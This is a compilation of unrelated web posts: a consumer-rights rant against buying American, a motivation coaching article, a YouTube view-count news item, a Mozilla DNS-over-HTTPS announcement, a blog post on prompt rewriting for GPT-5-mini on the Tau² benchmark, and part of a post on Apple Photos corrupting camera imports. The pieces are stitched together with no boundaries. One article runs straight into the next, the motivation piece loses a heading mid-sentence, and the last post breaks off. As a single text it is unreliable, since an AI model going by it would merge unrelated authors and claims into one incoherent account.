<div id="readability-page-1" class="page"><article>
                <h2 id="content-not-buying-american-anymore">Not buying American anymore</h2>
<p>I feel like I need to first defuse any idea of antagonizing Americans
themselves. The people are never to blame. This isn't a post criticizing the
American people, it's criticizing the state of things that makes it impractical
to have any sort of economical relation with the country if you are an average
Joe like me.</p>
<h2 id="content-where-do-i-come-from">Where do I come from</h2>
<p>I come from a place where I believe regulation needs to be employed to protect
the weaker party in any economic relation. If you don't agree with this
probably this rant isn't for you.</p>
<p>I also come from Brazil, a country that, for better or worse, is arguably a
strongly regulated market. For worse I guess because it makes all transactions
that bit more bureaucratic, for better because I am sure to be able to buy
something and have it too, without fear that corporations will swoop in and
take away my rights after purchase.</p>
<p>The <a href="https://www.gov.br/mj/pt-br/assuntos/seus-direitos/consumidor/Anexos/guia-do-consumidor-estrangeiro-ingles.pdf">Consumer Defense
Code</a>
is strong and mostly works, at least insofar as I needed to use it, and many
issues can be resolved directly with companies via
<a href="https://www.reclameaqui.com.br/">reclameaqui</a>, which is a website that
streamlines the communication with sellers to resolve problems without having
to go to court.</p>
<p>So here are my biases laid out in advance.</p>
<h2 id="content-why-am-i-writing-this">Why am I writing this</h2>
<p>I've been following <a href="https://www.youtube.com/@rossmanngroup">Louis Rossmann's youtube
channel</a> for a while now, mostly
because their tech repair videos are really interesting. And I really love
cats. But lately I've seen
<a href="https://youtu.be/HlyiLQ6WPRU?si=LeS8D1ntWfTUrUUB">many</a>
<a href="https://youtu.be/KNuZ3BjT7IU?si=93NVeqWEI1CO24Nv">worrying</a>
<a href="https://youtu.be/lzdIjCzKhfM?si=dET-MmiWzW7VJixk">videos</a> in the channel about
anti-consumer practices and I felt like I needed to vent.</p>
<p>You can ask why do I even care about these videos if I don't live in the US.
Well, in a globalized world where we are steadily blurrying the lines that
separate countries and nations (also for better and worse), there is really no
such distinction. Sure when I buy services and pay for them in my local
currency, I'm likely protected by local laws, and also in the case of Netflix
I'm also restricted by geographical limitations, but that's not always the
case, specially when purchasing software.</p>
<p>I've just came across <a href="https://youtu.be/YAx3yCNomkg?si=PhsAcUN-z7zXpvOC">this
video</a> where Louis explains
what Reason studios did to screw over their customers by removing the option to
activate older products that still work fine. I am also a musician in my spare
time, mostly hobbyist, but I did purchase music production software before and
I could just as easily have been a victim of such customer-hostile practices. I
don't need to be American to be an interested party when laws, or lack thereof,
of foreign country directly affects me.</p>
<h2 id="content-current-state-of-things">Current state of things</h2>
<p>All this points to a very clear trend, at least for me, that the US is <a href="https://www.hks.harvard.edu/faculty-research/policycast/oligarchy-open-what-happens-now-us-forced-confront-its-plutocracy">openly
an
oligarchy</a>.
And this explains very well this trend of consumer-hostile practices.</p>
<p>If a country and its laws serve the nobility and the extremely wealthy, it'll
work in favor of those, of maintaining their status and wealth. An oligarchy
isn't a regime that is characterized by actively screwing over the common
people. It doesn't need to be. All it needs is to give a free pass for those
that maintain power and influence to do whatever they want in order to maximize
their profits and expand their influence.</p>
<p>This is why all these anti-consumer practices are happening out in the open.
Really... what are the chances that in the current administration a profitable
company will be prosecuted by anti-consumer practices?</p>
<p>Given time, a liberal capitalist democracy with excessively weak regulations
will eventually devolve into a plutocracy just because companies need to make
money to appease investors at all costs. When they are out of ideas for
innovation, or when innovation is just too risky, they will <a href="https://www.baldurbjarnason.com/2024/the-deterioration-of-google/">make their
services
worse</a>,
<a href="https://shawlewenz.com/11-times-big-brands-violated-consumer-protection-laws/">violate consumer protection laws if it makes them more
competitive</a>
and <a href="https://disconnect.blog/ive-had-it-with-microsoft/">make the consumer pay more for
it</a>, just because it looks
good in a quarterly report -- which I guess <a href="https://www.reuters.com/sustainability/boards-policy-regulation/trump-renews-calls-ending-quarterly-reports-companies-2025-09-16/">won't be quarterly
anymore</a>
because it's not looking too good lately.</p>
<h2 id="content-a-counter-argument">A counter argument</h2>
<p>There is a point to be made that all these changes were made recently and that
there was no reason not to buy American ten, fifteen years ago. And therefore
this logic of not buying American isn't going to work because the same can
happen anywhere else.</p>
<p>But I'd disagree. We can't and we don't need to be able to see the future to
make informed decisions. Ten years ago there was no reason not to buy American.
There is now and that's the end of it. If I start buying European and they
start behaving like the US does now, then this rant will just as easily apply
to them.</p>
<p>A good, informed decision doesn't require knowledge of the future. It just need
to be grounded in solid contemporary facts, and the fact is there is no reason
we can trust American companies anymore.</p>
<p>This rant also isn't to say that <em>all</em> American companies are trying to make
the largest possible profit at the expense of their customers. There surely are
legit businesses trying to be profitable at the same time as they care and
protect their customers. Unfortunately these same theoretical companies are
subjective to the current US economical ethos that exposes them to hostile
takeovers and pressure from investors. This is why in an unregulated market
that makes it <em>that</em> easy to screw customers over, even those that are honest
good-working citizens can't really be trusted to run stable and responsible
companies in the long run.</p>
<h2 id="content-a-moral-imperative">A moral imperative</h2>
<p>The TLDR is: if you can, don't buy American. I'm not buying it anymore if I
can. There is little innovation to be had there, little protection to rely upon
and to be honest little incentive to keep buying it, because the rest of the
world is picking up relatively quickly, since all the wealth has had a negative
impact in the incentive for the US industry to keep itself up to date.</p>
<p>Choosing not to buy American is a message. The message is simple. I don't need
it. I would like to keep improving on things, keep working together and be part
of flourishing global community. But I don't have to. I can make do with less
feature-packed alternatives that will serve me longer term. I can do without
all the wealth and shiny things, because honestly in a couple of decades time
nobody will even remember it if the US keeps not paying attention to those that
generate actual value to the world, the people. If you change your laws, if you
can show that you are not out there to get my money at all costs, then we are
back in business. Until them I'm not buying American anymore.</p>
<p>Nothing is too big that it can't be replaced.</p>

                <p>We have an air bike in our basement. If you are unfamiliar with air bikes, they are similar to stationary bikes with foot pedals but also have handles you push and pull with your arms. It uses air resistance, so the harder you pedal and move your arms, the higher the resistance.&nbsp;</p><p>It’s also known as an assault bike. 😬</p><p>Which is apt, because it’s a <em>butt-kicker</em> of a workout. I use it about once a week, more frequently in the winter when it’s too cold to run, and less often in the summer when I can get outside more. And I kind of hate it!</p><p>Before I even drag myself to our basement, I’m already dreading it. The only way I can convince myself to do it is by finding a suitably engaging show I can distract myself with on my phone while I huff and puff.&nbsp;</p><p>Every time, I start my warm-up and think to myself,</p><p>“It’s only 30 minutes, I can do this!”</p><p>Like clockwork, within the first three minutes, I think, “Maybe I will only do ten minutes today and do some pilates or weights instead.”</p><p>After ten minutes, I think, “OK, surely I can make it to 20 minutes, and that will be enough”.</p><p>After 20 minutes, as I gasp for air and sweat soaks through my shirt, I think “Well, I already made it to 20 minutes… I guess I will just finish it.”</p><p>And then I proceed to huff and puff to the end, wherein I walk my wobbly legs back up the stairs to do a cooldown. At which point I think, “That suuuuuucked…” And then congratulate myself on finishing as I try to get my heart rate back to normal. 🥵</p><p>This mental dance happens, without fail, every single time I ride.&nbsp;</p><hr><p>I share this anecdote because it illustrates how tricky motivation can be, especially when faced with something you don’t want to do or have been procrastinating on. There are any number of things you have to deal with in your life that you don’t want to. There are even things you might generally enjoy that feel like they are hanging over you.&nbsp;</p><p>The pattern often goes like this:</p><ul><li>Before you start, it feels daunting, and the prospect lingers in the back of your mind. You know it needs to be done, but you really, <em>really</em> don’t feel like it. You leave it until it starts to loom larger and larger.</li><li>When you finally convince yourself to start, it’s not what you want to be doing, but it’s generally <em>fine</em>. It’s often not even as bad as you thought it would be, and it feels good to make progress.</li><li>As you near the end, you can even push yourself a little to wrap it up and get it off your plate.</li><li>When it’s over, you feel relieved, like a weight has been taken off your shoulders, and you are both pleased with yourself and a little annoyed that it took you so long to deal with.</li></ul><p>Sound familiar?&nbsp;</p><p>Motivation is a topic that comes up with nearly all my clients, as they navigate the various complexities of their lives. In some ways, motivation seems simple. You ask yourself, <strong>“Why can’t I just <em>make</em> myself be motivated to do the thing?”</strong>, whatever the thing might be. However, as you beat yourself up about it, consider that many factors influence our decision-making and the feeling of being motivated.</p><p>Humans are complex creatures, with <a href="https://thetouchpointsolution.com/blogs/touchpoints-blog/the-impact-of-brain-chemicals-on-mood-and-health?ref=ashleyjanssen.com"><u>numerous brain chemicals and hormones</u></a> influencing our overall physical and emotional state, which themselves are constantly impacted, sometimes drastically, by things like:</p><ul><li>Have you been sleeping well and enough?</li><li>Have you been eating well and the right amount for you?</li><li>Have you been imbibing in alcohol or other things?</li><li>Have you been moving your body regularly?</li><li>Do you have any physical or mental conditions?</li><li>Are you in pain?</li><li>Do you have significant life stressors at this time?</li><li>What time of day is it?</li><li>Where are you in your natural hormone cycles?</li><li>How old are you?</li><li>Have you had any conflicts in your life recently?</li><li>Did you move your body in a way entirely within your usual routines, but apparently in a way that is no longer acceptable?&nbsp;</li><li>Did you sleep in a slightly different position than usual, and now your back will never be the same again?</li></ul><p>I could go on, but you get the idea.😅</p><p>All of these factors (and more) conspire to shift your mood, physical energy, and mental energy, often making it harder to muster the motivation to do things. What, then, can you do to move things in the right direction? How do you motivate yourself to do a thing you don’t want to do?</p><p>Here are several ways to help encourage action when you feel unmotivated.&nbsp;</p><h2 id="1-think-about-why-you-are-feeling-unmotivated">1. Think about <em>why</em> you are feeling unmotivated</h2><p>There are many external and internal factors, as listed above, that contribute to motivation.&nbsp;</p><ul><li>When your body isn’t feeling good, it’s harder to make it do things.&nbsp;</li><li>When your mind is tired, distracted, or overwhelmed, it’s challenging to focus and accomplish tasks.&nbsp;</li><li>When the thing you need to do isn’t important to you or something you don’t like, it’s hard to make yourself do it.</li></ul><p>When you know why you aren’t motivated, you can think about what you could change to make things easier on yourself. What factors do you have control over?&nbsp;</p><ul><li><strong>Environment</strong> - Is there a place you can go or a thing you can add that will make it feel easier? For example, I have my writing desk set up in a quiet corner of my bedroom (not the office I share with my husband) to help make writing easier, even when I am not feeling it.&nbsp;</li><li><strong>Mood</strong> - Is there something that will help boost your mood? Go for a ten-minute walk, treat yourself to a donut, text your best friend for a pep talk, turn on your favourite tunes… anything that will give you a little pick-me-up.</li><li><strong>Body</strong> - Are there things you can do to take care of your body to make it feel better? Try some stretching, take a nap, meditate, read a book, get some fresh air, go for a run, eat a comfort meal, or do anything that will help your body feel less stressed.</li><li><strong>Negative or fear motivators</strong> - Is the thing you are not motivated to do being motivated by negative or <a href="https://ashleyjanssen.com/7-strategies-to-stop-fear-based-decision-making/"><u>fear motivators</u></a>? These include things like fear of judgment, fear of conflict, shame, guilt, or obligation. These motivators only go so far and deserve further examination to determine their place in your priorities. Maybe they aren’t things you need to do in the first place.&nbsp;&nbsp;</li></ul><p>The key point here is to identify where you have control and where you don’t, and then do your best to adapt your circumstances to make it easier to take action.</p><h2 id="2-identify-what-does-motivate-you">2. Identify what <em>does</em> motivate you&nbsp;</h2><p>When you think about the various activities and tasks you do each day, what is it that encourages you to do them? Some of those things will be negative motivators, as I mentioned above, but others will be things you do for fun, because they are interesting or rewarding. These are some tactics to consider for things that might help motivate you:</p><h3 id="combine-the-task-with-something-you-enjoy">Combine the task with something you enjoy</h3><p>You know what makes cleaning out the garage a lot better? Some good tunes. Throw on an audiobook while you cook dinner. Watch a good show while you huff and puff on the air bike! Think about the things you enjoy and consider how you can combine them with the thing you're trying to motivate yourself to do.</p><h3 id="add-external-accountability">Add external accountability</h3><p>Sometimes it can be challenging to push yourself to do something when there are no external motivators. Ask a friend to be your accountability buddy, or hire a professional to help you stay accountable for the thing you're trying to do, such as a coach, trainer, teacher, or dietitian. I know that one of the significant value-added benefits my clients get from <a href="https://ashleyjanssen.com/consulting/"><u>working with me</u></a> for a few months is having someone they have to report back to on their progress!</p><h3 id="gamify">Gamify</h3><p>Is there any way to turn the process or thing you are unmotivated to do into a game? Can you add rewards if you do a certain amount, or set a goal for how many days you make progress in a row? For example, one of my motivators for doing some kind of fitness every day is<a href="https://ashleyjanssen.com/how-tracking-and-streaks-help-you-establish-habits-and-reach-your-goals/"><u> keeping up my streak</u></a>! 2817 days in a row as of publishing. 😁</p><h3 id="celebrate-milestones">Celebrate milestones</h3><p>Beyond small planned rewards, having something to look forward to as you make progress on your task or activity can also help encourage you to continue moving forward. Maybe you take a day off, order your favourite takeout, or simply share it with someone you care about.&nbsp;</p><p>For more specifics on types of motivation, read my article, <a href="https://ashleyjanssen.com/what-motivates-you-learn-the-types-of-motivation-and-how-to-use-them/"><u>What Motivates You?

Break it into smaller chunks</h2><p>If part of why you feel unmotivated is that what you need to do feels big and overwhelming, often the best thing you can do is try to break it down into smaller, more manageable pieces. What is the smallest amount you can do to make a bit of progress?</p><ul><li>Commit to spending 5 minutes on it</li><li>Choose a small corner of a room you need to clean</li><li>Commit to writing the outline</li><li>Write the text, even if you don’t send it</li><li>Plan in your calendar when you will do it, so you don’t have it sitting in the back of your mind</li><li>Talk about it with your partner or a friend</li><li>Switch tasks to take a break and come back to it</li></ul><p>Often, getting over the hump of <em>starting</em> something is enough to help push you through it. Even if it isn’t, at the very least, you have made some amount of progress, which you can build on.&nbsp;</p><h2 id="4-consistency-over-motivation">4. Consistency over motivation</h2><p>If the thing you need to do is something you need to do regularly, like writing, fitness, practicing an instrument, or cleaning, you can’t rely purely on motivation to drive you. Even for things you enjoy, it’s easy to push something off <em>“until you feel like it”.</em> But with so many factors affecting your mood and energy, the times when you feel like it will be fleeting. Instead of relying on motivation, try to establish a routine that fosters consistency.&nbsp;</p><ul><li>Plan your <a href="https://ashleyjanssen.com/time-blocking-and-imagining-your-ideal-week/" rel="noreferrer">intentional week</a> so you have an idea of when you intend to do it</li><li>Set a daily reminder</li><li>Book it in your calendar</li><li>Set a certain amount of time you will put aside each day or week to chip away at it</li></ul><p>A little bit, consistently, will go a long way.</p><h2 id="5-put-it-on-the-back-burner">5. Put it on the back burner</h2><p>Sometimes, when you are not feeling motivated to do something, it’s reasonable to just put it on the back burner. Maybe it’s just not a priority right now, and that’s totally fine! Ask yourself, is this <a href="https://ashleyjanssen.com/how-to-juggle-priorities-decide-which-balls-are-glass-and-which-are-plastic/"><u>a glass ball</u></a> or a plastic ball? If it’s plastic, set it aside for a bit and focus your time and energy on other things.</p><p>It's ok to decide now is not the right time, but make it an intentional decision instead of something you avoid and feel bad about!</p><hr><p>If you're struggling with motivation, you're not alone! It’s normal, it’s natural, and there are tons of different, ever-changing factors that will change how you feel. Do your best to examine where you are at, control what you can control, and make progress where you can!</p><p>Need some help getting motivated? Get in touch!</p>

<p>Over the past month or so, many YouTubers have been reporting major drops to their video view counts. Theories have run wild, but there’s one explanation involving ad blockers that makes the most sense, but YouTube isn’t confirming anything directly.</p>



<p>Since mid-August, many YouTubers have noticed their view counts are considerably lower than they were before, in some cases with very drastic drops. The reason for the drop, though, has been shrouded in mystery for many creators.</p>



<p>The most likely explanation seems to be that YouTube is not counting views properly for users with an ad blocker enabled, another step in the platform’s continued war on ad blockers. This was first realized <a href="https://youtu.be/YX1eEe8erkQ">by Josh Strife Hayes, who noticed</a> that view counts on TV, phones, and tablets have been steady, while views on computers have dropped by around 50% since the mid-August trend started. TechLinked, a channel in the Linus Tech Tips family, <a href="https://youtu.be/gZ5pATTvc2o">confirmed similar numbers within its statistics</a>.</p>



<p>This aligns with one of the possible explanations that <a href="https://support.google.com/youtube/thread/373195597">YouTube itself hinted at in an acknowledgement of lower view counts. </a></p>	
	



<p>Google says:</p>



<blockquote>
<p><strong>Viewers Using Ad Blockers &amp; Other Content Blocking Tools:&nbsp;</strong>Ad blockers and other extensions can impact the accuracy of reported view counts. Channels whose audiences include a higher proportion of users utilizing such tools may see more fluctuations in traffic related to updates to these tools.</p>
</blockquote>




	<p>The rest of the post addresses prior speculation that YouTube’s <a href="https://9to5google.com/2025/08/07/youtube-ai-age-verification-what-to-know/">new AI-powered age verification tools</a> were to blame – which YouTube adamantly says is not the case – while also offering other possible explanations such as “seasonal viewing habits” and competition on the platform. </p>



<p>YouTube says “there is no systemic issue that is impacting creators” regarding lower view counts.</p>



<p>This ad blocker situation does seem the most likely explanation, though. In <a href="https://youtu.be/KqCV6Rk8kOA">a prior video</a>, Linus Tech Tips had noted that while view counts were down, ad revenue was not. If computer views are the only ones down, it stands to reason that viewers using an ad blocker are not being counted correctly, especially if ad revenue isn’t taking a hit from the lower view counts. YouTube’s hint that ad blockers “can impact the accuracy of reported view counts” certainly suggests this is possible, even if it’s not firm confirmation.</p>

<div id="readability-page-1" class="page"><div id="content">
  <main id="main">

    
<article id="post-81686">
  

  <div>
    
<div><p>All web browsing starts with a DNS query to find the IP address for the desired service or website. For much of the internet’s history, this query is sent in the clear. <a href="https://en.wikipedia.org/wiki/DNS_over_HTTPS">DNS-over-HTTPS (DoH)</a> plugs this privacy leak by encrypting the DNS messages, so no one on the network, not your internet service provider or a free public WiFi provider, can eavesdrop on your browsing.</p><p>In 2020, Firefox became the first browser to roll out <a href="https://blog.mozilla.org/en/firefox/firefox-continues-push-to-bring-dns-over-https-by-default-for-us-users/"><strong>DoH by default</strong></a>, starting in the United States and in 2023, we announced the Firefox <a href="https://blog.mozilla.org/en/mozilla/news/firefox-by-default-dns-over-https-rollout-in-canada/">DoH-by-default rollout in Canada</a>, powered by our trusted partner, the Canadian Internet Registration Authority (CIRA).</p></div>



<p>This year, we’ve built on that foundation and delivered major performance improvements and mobile support, ensuring more Firefox users benefit from privacy without compromise.</p>



<h2><strong>Introducing DoH for Android</strong></h2>



<p>After bringing encrypted DNS protection to millions of desktop users, we’re now extending the same to mobile. Firefox users who have been waiting for DoH on Android can now turn it on and browse with the same privacy protections as on their desktops.</p>



<p>Starting with this week’s release of <strong>Firefox 143 for Android</strong>, users can choose to enable DoH in Firefox on their mobile devices by selecting “<a href="https://support.mozilla.org/en-US/kb/configure-dns-over-https-protection-levels-firefox-android#w_increased-protection">Increased Protection”</a> DoH configuration. Performance testing with <a href="https://wiki.mozilla.org/Security/DOH-resolver-policy#Conforming_Resolvers">Firefox DoH partners</a> is currently underway. If DoH is as fast as we expect, we plan to enable it by default for Android users in certain regions, similar to desktop users. Until then, these configuration options provide you the choice to opt in early.</p>


<div>
<figure><img decoding="async" width="683" height="1024" src="https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image-683x1024.png" alt="" srcset="https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image-683x1024.png 683w, https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image-200x300.png 200w, https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image-768x1152.png 768w, https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image-1000x1500.png 1000w, https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image.png 1024w" sizes="(max-width: 683px) 100vw, 683px"><figcaption><em>Enable DoH in Firefox on Android</em></figcaption></figure></div>


<h2><strong>DoH performance breakthroughs in 2025</strong></h2>



<p>DNS resolution speed is critical to the browsing experience — when web pages involve multiple DNS queries, the speed difference compounds and can cause page loads to be slow. Since we first rolled out DoH in Canada, we’ve worked closely with CIRA for reliability and performance measurements. Through our strong collaboration with them and their technology partner Akamai, Firefox DoH lookups are now <strong>61% faster</strong> year-to-date for the 75th percentile.</p>



<p>With these performance improvements, DoH resolution time is now within a millisecond or two of native DNS resolution. This is a big win because <strong>Firefox users in Canada now get the privacy of encrypted DNS with no performance penalty</strong>.</p>



<p>Although the investigation and analysis started with the desire to improve DoH in Firefox, the benefits didn’t end there. Our collaboration also improved CIRA DoH performance for many of its DNS users, including Canadian universities, as well as other DNS providers relying on CIRA’s or Akamai’s server implementations.</p>



<p>This is a win not just for Firefox users, but for the many other users around the globe.</p>



<h2><strong>Robust privacy on your terms</strong></h2>



<p>We have always approached DoH with an emphasis on transparency, user choice, and strong privacy safeguards. Firefox gives users meaningful control over how their DNS traffic is handled: Users can opt out, choose their own resolver, or adjust DoH protection levels, and Firefox makes it clear what DoH is doing and why it matters.</p>



<p>Firefox enforces strict requirements for DNS resolvers before trusting them with your browsing. Not every DNS provider can become a DoH provider in Firefox — only those that meet and attest to Mozilla’s rigorous <a href="https://wiki.mozilla.org/Security/DOH-resolver-policy">Trusted Recursive Resolver (TRR) policy</a> through a legally binding contract.</p>



<h2><strong>Prioritizing your privacy and speed</strong></h2>



<p>Our work with DoH this year shows what’s possible when privacy and performance go hand-in-hand. We’ve proven that encrypted DNS can be fast, reliable, and available on desktop and Android. Just as importantly, we’ve shown that partnerships grounded in open standards and accountability can deliver benefits not only to Firefox users but to the wider internet.</p>



<p>As we look forward, our commitment stays the same: Privacy should be the default, speed should never be a compromise, and the web should remain open and accessible to everyone. Choosing Firefox means choosing a browser that is built for you and for a better internet.</p>

<div id="readability-page-1" class="page"><div data-astro-cid-xj2uyz6m="">  <p><strong>Now on the front page of Hacker News — <a href="https://news.ycombinator.com/item?id=45275354">join the discussion</a>.</strong></p>
<p>In <a href="https://quesma.com/blog/tau2-from-llm-benchmark-to-blueprint-for-testing-ai-agents/">a recent post</a>, we introduced the Tau² benchmark, a framework for benchmaring LLMs. Today we’re sharing a surprising discovery we made while using it: a simple <strong>prompt rewrite boosted a small model’s success rate by over 20%</strong>. This post is a deep-dive on how we found and fixed this performance bottleneck by making subtle changes to agent policies.</p>
<h2 id="benchmarking-llms-with-tau">Benchmarking LLMs with Tau²</h2>
<p>On the recent OpenAI Summer Update, we have seen that GPT-5 model has made significant strides in agentic tasks. To validate these claims, they’ve turned to the Tau² benchmark, which simulates real-world agent interactions across various domains like telecom, retail, and airlines.</p>
<p>Before moving any further, we have to establish that GPT-5 showed significant improvement only in one benchmark domain - which is Telecom. The other ones have been somehow overlooked during model presentation - therefore we won’t bother about them either (😉).</p>
<p><img alt="Bar chart comparing GPT-5, OpenAI o3, and GPT-4.1 tool use accuracy in telecom, retail, and airline" loading="lazy" decoding="async" fetchpriority="auto" width="1999" height="947" src="https://quesma.com/_astro/image2.3Ev8Kk46_Z2q2E1W.webp"></p>
<p>In agentic interactions, accuracy is non-negotiable, but model speed is equally vital for user experience. Therefore, it makes sense to consider alternatives to flagship models, such as the recently introduced GPT-5-mini.</p>
<p>GPT-5-mini offers significant advantages: it’s roughly twice as fast in latency and noticeably more efficient in throughput. While delivering 85–95% of the full GPT-5’s performance, it is also five times cheaper.</p>
<p>Therefore, we ran an experiment to explore two things:</p>
<ul>
<li>How well GPT-5-mini performs on this benchmark.</li>
<li>Whether we can improve its results by making subtle changes to the domain, such as modifying agent policies or task descriptions.</li>
</ul>
<h2 id="baseline-expect-gpt-5-mini-to-fail-45-of-the-time">Baseline: Expect GPT-5-mini to Fail 45% of the Time</h2>
<p><img alt="GPT-5, GPT-5 mini, and GPT-5 nano model options with descriptions" loading="lazy" decoding="async" fetchpriority="auto" width="1902" height="572" src="https://quesma.com/_astro/image3.CmeGdum5_1a59hL.webp"></p>
<p>Firstly, we’re going to establish the benchmark for the GPT-5-mini model. As the telecom benchmark contains over 100 tests, we’ll use their subset. Luckily, the telecom_small task set comes in handy with just 20 test scenarios.</p>
<p>Running the benchmark with:</p>
<pre tabindex="0" data-language="bash"><code><span><span>tau2</span><span> run</span><span> \</span></span>
<span><span>    --domain</span><span> telecom</span><span> \</span></span>
<span><span>    --agent-llm</span><span> gpt-5-mini</span><span> \</span></span>
<span><span>    --user-llm</span><span> gpt-5-mini</span><span> \</span></span>
<span><span>    --num-trials</span><span> 2</span><span> --task-set-name</span><span> telecom_small</span></span></code></pre>
<p>Our results are:
<img alt="Simulation results showing average reward 0.55 and cost per conversation $0.0292" loading="lazy" decoding="async" fetchpriority="auto" width="1999" height="412" src="https://quesma.com/_astro/image4.B03mMqZq_1aIjlH.webp"></p>
<p>We ended up running 40 simulations:<br>
<img alt="Simulation task results with green checkmarks and red Xs showing successes and failures" loading="lazy" decoding="async" fetchpriority="auto" width="1950" height="1414" src="https://quesma.com/_astro/image5.CyupezbJ_Z1blhYq.webp"></p>
<p>The initial success rate was low: <strong>just 55%</strong>. The GPT-5-mini with its limited reasoning capabilities doesn’t even get close to flagship GPT-5.</p>
<p>There’s an additional interesting metric this benchmark has introduced, which is pass^k. This measures how well an agent can perform when it’s challenged with the same task k times. I like to think of it as the <strong>reliability of the AI Agent</strong>.<br>
Another intriguing aspect of this benchmark are tasks which failed for all given trials - which could imply that the <strong>AI Agent is simply not capable of handling at all</strong>. This can happen due to multiple factors - reasoning might be too difficult, user ask could not be specific enough, etc.</p>
<h2 id="the-hack-using-claude-to-rewrite-prompts-for-gpt-5-mini">The Hack: Using Claude to Rewrite Prompts for GPT-5-mini</h2>
<p>When hacking the AI Agent for <code>GPT-5-mini</code> model we aimed to answer three questions:</p>
<ul>
<li>Can I improve the overall success rate when using this limited model?</li>
<li>Are we able to “unlock” more tasks which agents are capable of handling?</li>
<li>Does agent reliability improve?</li>
</ul>
<p>The beauty of generative AI is that we could offload lots of work and allow ourselves a little laziness. Therefore, we asked Claude to analyze the AI agent policies in the telecom domain, which are the building blocks for the agent prompt. From there, we asked specifically to assume that these policies are going to feed an AI Agent prompt, which will be using faster, non-flagship LLM. Output documents (<code>main_policy.md</code> and <code>tech_support_manual.md</code>) will have to be rephrased so that they are easier to follow for the agent and result in improving its behaviour.</p>
<p>Here’s the “executive summary” of improvements it made:</p>
<pre tabindex="0" data-language="markdown"><code><span><span>I've created two AI-optimized versions of the telecom domain documentation:</span></span>
<span></span>
<span><span>Key Improvements Made:</span></span>
<span></span>
<span><span>1.</span><span> Structure &amp; Flow</span></span>
<span><span>   -</span><span> Decision Trees: Clear branching logic with ├── and └── notation</span></span>

<span><span>   -</span><span> Error Handling: Specific failure conditions and next steps</span></span>
<span><span>   -</span><span> Verification Steps: "Recheck" instructions after each fix</span></span>

<span><span>   -</span><span> Used imperative commands: "Check X", "If Y then Z"</span></span>
<span><span>   -</span><span> Added immediate verification steps</span></span></code></pre>
<p>We’ve moved from lengthy policy declarations to clear, directive instructions. Instead of wordy statements, the new style uses step-by-step logic, conditions, and patterns. For prompts, this works more like a checklist — “Check X → If Y, then Z” — rather than vague, descriptive policies.</p>
<h2 id="the-result-22-accuracy-boost-and-50-fewer-unsolvable-tasks">The Result: 22% Accuracy Boost and 50% Fewer Unsolvable Tasks</h2>
<p>Let’s review what our improved AI agent results look like:</p>
<p><img alt="Simulation results showing agent metrics with rewards, pass rates, and cost per conversation" loading="lazy" decoding="async" fetchpriority="auto" width="1999" height="435" src="https://quesma.com/_astro/image6.Djj-zTez_RWCcw.webp"></p>
<p>The new prompts led to a significant performance boost.
Pass^k metrics surged:</p>
<ul>
<li>k=1 from 0.55 to 0.675 (<strong>a 22.73% improvement</strong>) → In plain terms, GPT-5-mini now succeeds on <strong>67.5% of tasks instead of 55%</strong>.</li>
<li>k=2 from 0.4 to 0.5 (<strong>a 25% improvement</strong>) → Meaning retries became more effective too.</li>
</ul>
<p>For context, flagship GPT-5 scores ~97% on this benchmark, o3 comes in at 58%, and GPT-4.1 at 34%. With our optimized prompts, GPT-5-mini not only jumped well above its own baseline but also <strong>outperformed o3</strong>, landing much closer to GPT-5 than before.</p>
<p>The side-by-side comparison shows exactly where the gains came from. On the left side of the screen you’ll see the “stock” AI agent results, on the right - our AI agent improved for GPT-5-mini.</p>
<p><img alt="Side-by-side console logs comparing stock AI results with improved GPT-5-mini test runs" loading="lazy" decoding="async" fetchpriority="auto" width="1999" height="722" src="https://quesma.com/_astro/image7.BWRFnxLy_2mRVVB.webp"></p>
<p>The screenshot above outlines that with our updated prompts and policies, <strong>we managed to “unlock” some of the tests which were previously always failing</strong> due to GPT-5-mini’s limited capabilities. Now there are only 3 tasks, which the agent didn’t manage to solve at all within the given 2 trials - compared to 6.</p>
<h2 id="key-takeaways-for-your-own-models">Key Takeaways for Your Own Models</h2>
<p>This experiment shows that thoughtful prompt design can meaningfully boost the performance of smaller models like GPT-5-mini. By restructuring policies into clear, step-by-step instructions, we not only improved success rates but also “unlocked” tasks that previously seemed unsolvable for the model.</p>
<p>The key was in simplifying language, reducing ambiguity, and breaking down reasoning into explicit, actionable steps. Smaller models struggle with long-winded or fuzzy policies, but thrive when given structured flows, binary decisions, and lightweight verification steps.</p>
<p>The takeaway is clear: using a frontier model to automatically optimize prompts can unlock major improvements for smaller LLMs.
With strategic optimization, lightweight models can deliver decent results at a fraction of the cost — making them a compelling alternative when efficiency and affordability matter as much as accuracy.</p>
<p>If you found this helpful, let us know! Prompt engineering is still an open playground, and we’re excited to see what creative approaches others are exploring in this space.</p>

<div id="readability-page-1" class="page"><div>
      <p>The Apple Photos app sometimes corrupts images when importing from my camera.
I just wanted to make a blog post about it in case anyone else runs into the problem.
I’ve seen other references to this online, but most of the people gave up trying to fix it, and none of them went as far as I did to debug the issue.</p>
<p>I’ll try to describe the problem, and the things I’ve tried to do to fix it.
But also note that I’ve (sort of) given up on the Photos app too.
Since I can’t trust it to import photos from my camera, I switched to a different workflow.</p>
<p>Here is a screenshot of a corrupted image in the Photos app:</p>
<p><img src="https://tenderlovemaking.com/images/corrupt-image.png" alt="screenshot of a corrupt image"></p>
<h2 id="how-i-used-to-import-images">How I used to import images</h2>
<p>I’ve got an <a href="https://en.wikipedia.org/wiki/OM_System_OM-1">OM System OM-1</a> camera.
I used to shoot in RAW + jpg, then when I would import to Photos app, I would check the “delete photos after import” checkbox in order to empty the SD card.
Turns out “delete after import” was a huge mistake.</p>
<h2 id="getting-corrupted-images">Getting corrupted images</h2>
<p>I’m pretty sure I’d been getting corrupted images for a while, but it would only be 1 or 2 images out of thousands, so I thought nothing of it (it was probably my fault anyway, right?)</p>
<p>But the problem really got me upset when last year I went to a family member’s wedding and took tons of photos.
Apple Photos combines RAW + jpg photos so you don’t have a bunch of duplicates, and when you view the images in the photos app, it just shows you the jpg version by default.
After I imported all of the wedding photos I noticed some of them were corrupted.
Upon closer inspection, I found that it sometimes had corrupted the jpg, sometimes corrupted the RAW file, and sometimes both.
Since I had been checking the “delete after import” box, I didn’t know if the images on the SD card were corrupted <em>before</em> importing or not.
After all, the files had been deleted so there was no way to check.</p>
<p>I estimate I completely lost about 30% of the images I took that day.</p>
